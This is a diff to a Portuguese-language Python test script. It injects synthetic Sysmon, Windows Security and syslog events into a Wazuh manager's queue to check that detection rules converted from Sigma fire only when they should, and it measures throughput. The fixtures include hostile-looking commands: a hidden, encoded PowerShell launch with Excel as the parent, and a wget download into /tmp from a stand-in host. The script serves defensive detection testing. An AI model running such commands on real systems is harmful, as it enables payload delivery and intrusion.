@@ -8,8 +8,10 @@ do próprio Wazuh se elas disparam quando devem e calam quando devem.
 """
 
 import json
+import subprocess
 import sys
 import time
+import uuid
 from pathlib import Path
 
 import urllib3
@@ -77,26 +79,58 @@ def registrar(nome, passou, detalhe=""):
     print(f"[{'PASSOU' if passou else 'FALHOU'}] {nome}" + (f": {detalhe}" if detalhe else ""), flush=True)
 
 
-def sysmon(imagem, pai, linha, usuario="EMPRESA\\maria"):
+def sysmon(imagem, pai, linha, usuario="EMPRESA\\maria", marca=""):
     return json.dumps({"win": {
         "system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational",
                    "severityValue": "INFORMATION", "message": "Process Create", "computer": "PC1"},
-        "eventdata": {"image": imagem, "parentImage": pai, "commandLine": linha, "user": usuario},
+        "eventdata": {"image": imagem, "parentImage": pai, "commandLine": linha, "user": usuario, "processGuid": marca},
     }})
 
 
-def seguranca(evento):
+def seguranca(evento, marca=""):
     return json.dumps({"win": {
         "system": {"providerName": "Microsoft-Windows-Security-Auditing", "eventID": str(evento), "channel": "Security",
                    "severityValue": "AUDIT_SUCCESS", "message": "Evento", "computer": "PC1"},
-        "eventdata": {"targetUserName": "x"},
+        "eventdata": {"targetUserName": marca},
     }})
 
 
-def regra_disparada(g, evento, formato="eventchannel", local="EventChannel"):
-    r = api_do(g, "PUT", "/logtest", json={"event": evento, "log_format": formato, "location": local})
-    saida = r["data"]["output"]
-    return saida.get("rule", {}).get("id"), saida.get("rule", {}).get("description"), saida
+INJETOR = """
+import socket, sys
+s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+s.connect("/var/ossec/queue/sockets/queue")
+s.send(("1:" + sys.argv[1] + ":" + sys.stdin.read()).encode())
+"""
+
+
+CARGA = """
+import socket, sys
+s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+s.connect("/var/ossec/queue/sockets/queue")
+m = ("1:EventChannel:" + sys.argv[1]).encode()
+for _ in range(int(sys.argv[2])):
+    s.send(m)
+"""
+
+
+def _no_gerenciador(g, *comando, entrada=None):
+    conteiner = f"roar-ger-{g['id']}-gerenciador-1"
+    return subprocess.run(["docker", "exec", "-i", conteiner, *comando], input=entrada, capture_output=True, text=True, timeout=120)
+
+
+def regra_disparada(g, evento, marca, local="EventChannel", espera=20):
+    """Entrega o evento na fila do gerenciador, como um agente faria, e lê os alertas gerados."""
+    entrega = _no_gerenciador(g, "/var/ossec/framework/python/bin/python3", "-c", INJETOR, local, entrada=evento)
+    if entrega.returncode:
+        raise RuntimeError(entrega.stderr[-300:])
+    fim, achados = time.monotonic() + espera, []
+    while time.monotonic() < fim:
+        saida = _no_gerenciador(g, "grep", "-a", marca, "/var/ossec/logs/alerts/alerts.json").stdout
+        achados = [json.loads(linha) for linha in saida.splitlines() if linha.strip()]
+        if achados:
+            break
+        time.sleep(1)
+    return [a["rule"]["description"] for a in achados], achados
 
 
 def main():
@@ -129,43 +163,81 @@ def main():
         registrar("regex inválido é recusado na validação", not aceito, json.dumps(detalhe)[:200])
         registrar("gerenciador segue válido depois da recusa", provisao._configuracao_valida(g["id"])[0])
 
-        xml = arquivo_de_regras(exemplos + extras)
+        xml = arquivo_de_regras(exemplos)
         aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", xml)
-        registrar("configuração válida com as regras", aceito, json.dumps(detalhe)[:400])
-        time.sleep(45)
+        registrar("configuração válida com as regras de exemplo", aceito, json.dumps(detalhe)[:400])
+        time.sleep(30)
         registrar("gerenciador volta depois de carregar", esperar_gerenciador(g, 240))
         total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
-        registrar("regras carregadas de verdade", total >= sum(len(r.xml) for r in exemplos + extras), f"{total} regras")
+        registrar("regras de exemplo carregadas", total == 3, f"{total} regras")
 
         print("\n== Dispara quando deve e cala quando deve", flush=True)
-        atacante = sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                          "C:\\Program Files\\Office\\EXCEL.EXE", "powershell -w hidden -enc AAAA")
-        rid, descricao, saida = regra_disparada(g, atacante)
-        registrar("ataque dispara a regra convertida", descricao == "PowerShell escondido iniciado pelo Excel", f"{rid} {descricao}")
-        print("   mitre no alerta:", (saida.get("rule", {}).get("mitre") or {}).get("id"), flush=True)
-        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                                                    "C:\\Windows\\explorer.exe", "powershell -w hidden"))
-        registrar("outro processo pai não dispara", descricao != "PowerShell escondido iniciado pelo Excel", str(descricao))
-        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                                                    "C:\\Program Files\\Office\\EXCEL.EXE", "powershell -w minimized"))
-        registrar("falta de um termo não dispara", descricao != "PowerShell escondido iniciado pelo Excel", str(descricao))
-        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                                                    "C:\\Program Files\\Office\\EXCEL.EXE", "powershell -w hidden",
-                                                    "AUTORIDADE NT\\SISTEMA"))
-        registrar("exceção cala a regra", descricao != "PowerShell escondido iniciado pelo Excel", str(descricao))
-        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
-                                                    "c:\\program files\\office\\excel.exe", "POWERSHELL -W HIDDEN"))
-        registrar("não diferencia maiúsculas, como o Sigma", descricao == "PowerShell escondido iniciado pelo Excel", str(descricao))
+        titulo = "PowerShell escondido iniciado pelo Excel"
+        powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        excel = "C:\\Program Files\\Office\\EXCEL.EXE"
+
+        def processo(imagem, pai, linha, **extra):
+            marca = f"marca{uuid.uuid4().hex}"
+            return regra_disparada(g, sysmon(imagem, pai, linha, marca=marca, **extra), marca)
+
+        descricoes, alertas = processo(powershell, excel, "powershell -w hidden -enc AAAA")
+        registrar("ataque dispara a regra convertida", titulo in descricoes, str(descricoes))
+        tecnicas = [t for a in alertas for t in a["rule"].get("mitre", {}).get("id", [])]
+        registrar("técnica MITRE chega ao alerta", "T1059.001" in tecnicas, str(tecnicas))
+        # Só vale se o evento gerou algum alerta: senão não prova que a regra calou.
+        descricoes, _ = processo(powershell, "C:\\Windows\\explorer.exe", "powershell -w hidden")
+        registrar("outro processo pai não dispara", descricoes and titulo not in descricoes, str(descricoes))
+        descricoes, _ = processo(powershell, excel, "powershell -w minimized")
+        registrar("falta de um termo não dispara", descricoes and titulo not in descricoes, str(descricoes))
+        descricoes, _ = processo(powershell, excel, "powershell -w hidden", usuario="AUTORIDADE NT\\SISTEMA")
+        registrar("exceção cala a regra", descricoes and titulo not in descricoes, str(descricoes))
+        descricoes, _ = processo("C:\\Windows\\System32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
+                                 "c:\\program files\\office\\excel.exe", "POWERSHELL -W HIDDEN")
+        registrar("não diferencia maiúsculas, como o Sigma", titulo in descricoes, str(descricoes))
 
         for evento in (4720, 4726):
-            _, descricao, _ = regra_disparada(g, seguranca(evento))
-            registrar(f"evento {evento} dispara o ramo do OU", descricao == "Conta criada ou apagada", str(descricao))
-        _, descricao, _ = regra_disparada(g, seguranca(4624))
-        registrar("outro evento não dispara", descricao != "Conta criada ou apagada", str(descricao))
+            marca = f"marca{uuid.uuid4().hex}"
+            descricoes, _ = regra_disparada(g, seguranca(evento, marca), marca)
+            registrar(f"evento {evento} dispara o ramo do OU", "Conta criada ou apagada" in descricoes, str(descricoes))
+        marca = f"marca{uuid.uuid4().hex}"
+        descricoes, _ = regra_disparada(g, seguranca(4624, marca), marca, espera=10)
+        registrar("outro evento não dispara", "Conta criada ou apagada" not in descricoes, str(descricoes))
 
-        linha = "Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/roarcarga http://exemplo.test/a"
-        _, descricao, _ = regra_disparada(g, linha, "syslog", "/var/log/syslog")
-        registrar("palavra-chave em log Linux dispara", descricao == "Download para o tmp seguido de execucao", str(descricao))
+        marca = f"marca{uuid.uuid4().hex}"
+        linha = f"Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/roarcarga http://exemplo.test/{marca}"
+        descricoes, _ = regra_disparada(g, linha, marca, local="/var/log/syslog")
+        registrar("palavra-chave em log Linux dispara", "Download para o tmp seguido de execucao" in descricoes, str(descricoes))
+        marca = f"marca{uuid.uuid4().hex}"
+        descricoes, _ = regra_disparada(g, f"Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/outra {marca}", marca,
+                                        local="/var/log/syslog", espera=8)
+        registrar("texto parecido em log Linux não dispara", "Download para o tmp seguido de execucao" not in descricoes, str(descricoes))
+
+        if extras:
+            print("\n== Base pública inteira", flush=True)
+            inicio = time.monotonic()
+            aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", arquivo_de_regras(exemplos + extras))
+            registrar("configuração válida com a base inteira", aceito, json.dumps(detalhe)[:300])
+            registrar("gerenciador volta com a base inteira", esperar_gerenciador(g, 300), f"{time.monotonic() - inicio:.0f}s")
+            total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
+            registrar("base inteira carregada", total >= sum(len(r.xml) for r in exemplos + extras), f"{total} regras")
+            inicio, descricoes = time.monotonic(), []
+            while time.monotonic() - inicio < 300 and titulo not in descricoes:
+                descricoes, _ = processo(powershell, excel, "powershell -w hidden")
+            registrar("ataque dispara com a base inteira", titulo in descricoes, f"{time.monotonic() - inicio:.0f}s, {descricoes[:4]}")
+            # Vazão real do gerenciador com a base inteira carregada.
+            marca = f"marca{uuid.uuid4().hex}"
+            lote, inicio = 2000, time.monotonic()
+            _no_gerenciador(g, "/var/ossec/framework/python/bin/python3", "-c", CARGA,
+                            sysmon(powershell, excel, "powershell -w hidden", marca=marca), str(lote))
+            fim, contados = time.monotonic() + 180, 0
+            while time.monotonic() < fim and contados < lote:
+                contados = int(_no_gerenciador(g, "grep", "-a", "-c", marca, "/var/ossec/logs/alerts/alerts.json").stdout.strip() or 0)
+                time.sleep(2)
+            duracao = time.monotonic() - inicio
+            print(f"   carga: {contados} alertas de {lote} eventos em {duracao:.0f}s, cerca de {contados / max(duracao, 1):.0f} por segundo", flush=True)
+            memoria = subprocess.run(["docker", "stats", "--no-stream", "--format", "{{.Name}} {{.MemUsage}}"],
+                                     capture_output=True, text=True).stdout
+            print("   memória:", [l for l in memoria.splitlines() if g["id"] in l], flush=True)
     finally:
         amb.limpar()
 
